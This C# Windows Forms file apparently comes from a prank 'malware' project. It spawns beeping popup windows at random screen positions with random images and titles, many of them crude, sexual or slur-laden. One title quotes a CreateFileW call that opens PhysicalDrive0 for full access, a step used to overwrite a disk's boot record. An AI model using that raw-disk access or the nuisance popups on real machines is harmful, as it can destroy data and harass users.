using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Media;
using System.Runtime.InteropServices;

namespace YesEscape
{
    public partial class popup : Form
    {
        static Random r = new Random();

        public popup()
        {
            Image[] images =
            {
                Properties.Resources.download,
                Properties.Resources.eating_sperm,
                Properties.Resources.FREE_ROBLOX,
                Properties.Resources.free_solaris,
                Properties.Resources.furry_headpats,
                Properties.Resources.javafox,
                Properties.Resources.javafox2,
                Properties.Resources.lol,
                Properties.Resources.nazar_skid,
                Properties.Resources.__proof___of_silver_skidding,
                Properties.Resources.say_gex,
                Properties.Resources.crap_feces,
                Properties.Resources.Sensist2K05,
                Properties.Resources.Silence_,
                Properties.Resources.silence_house,
                Properties.Resources.tspmo,
                Properties.Resources.tspmo2,
                Properties.Resources.tspmo3,
                Properties.Resources.niko_af,
                Properties.Resources.freedom_at_last,
                Properties.Resources.Noise_,
                Properties.Resources.noise_quote,
                Properties.Resources.pidr_griffin,
                Properties.Resources.silence_quote,
                Properties.Resources.skid_from_salinewin,
                Properties.Resources.skidding_centre,
                Properties.Resources.solarah_no_scam,
                Properties.Resources.bottom_5_thumbnails,
                Properties.Resources.SUCKER,
                Properties.Resources.ok,
                Properties.Resources.silver_pfp,
                Properties.Resources.live_niko_reaction,
                Properties.Resources.artifyber,
                Properties.Resources.dating_coach,
                Properties.Resources.frank,
                Properties.Resources.furries,
                Properties.Resources.geometry_dash,
                Properties.Resources.pussy_destroyer,
                Properties.Resources.your_ears_will_get_pregnant,
                Properties.Resources.u_ents,
                Properties.Resources.who_will_win_w11_or_lejbl,
                Properties.Resources.who_will_win_wxp_or_ponik,
                Properties.Resources.you_have_been_dinde,
                Properties.Resources.iamgoon
            };

            string[] titles =
            {
                "kek",
                "chek",
                "lol",
                "lmao",
                "lmfao",
                "free solarrah",
                "Silence.",
                "wtf is this popup",
                "these popups are annoying aren't they?",
                "Type your text",
                "PENIS LAND .i. .i. .i. .i. .i. .i. .i. .i. .i. .i. .i. .i. .i. .i. .i. .i. .i. .i. .i. .i. .i. .i. .i. .i. .i. .i. .i. .i. .i. .i. .i. .i. .i. .i. .i.",
                "why does this exist",
                "why do I exist?",
                "am I real???",
                "kek",
                "lol",
                "lmfao",
                "The Story Of The Boy Who Accidentally Ran Salinewin.exe",
                "HANDLE MBR = CreateFileW(\"\\\\\\\\.\\\\PhysicalDrive0\", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);",
                "I REALLY WANT SOLARIS",
                "i skid fron salinewin, bonzikill, memz, kinitopet, visual studio, windows, android, bsd, bios, uefi, bacteria, atoms, the concept of time, fabric of existence",
                "xdde",
                "xdde",
                "xdde"
            };

            int w = Screen.PrimaryScreen.Bounds.Width;
            int h = Screen.PrimaryScreen.Bounds.Height;

            InitializeComponent();
            SystemSounds.Beep.Play();
            BackgroundImage = images[r.Next(images.Length)];
            Location = new Point(r.Next(w - 400), r.Next(h - 400));
            Text = titles[r.Next(titles.Length)];
            Icon = SystemIcons.Information;
        }
    }
}
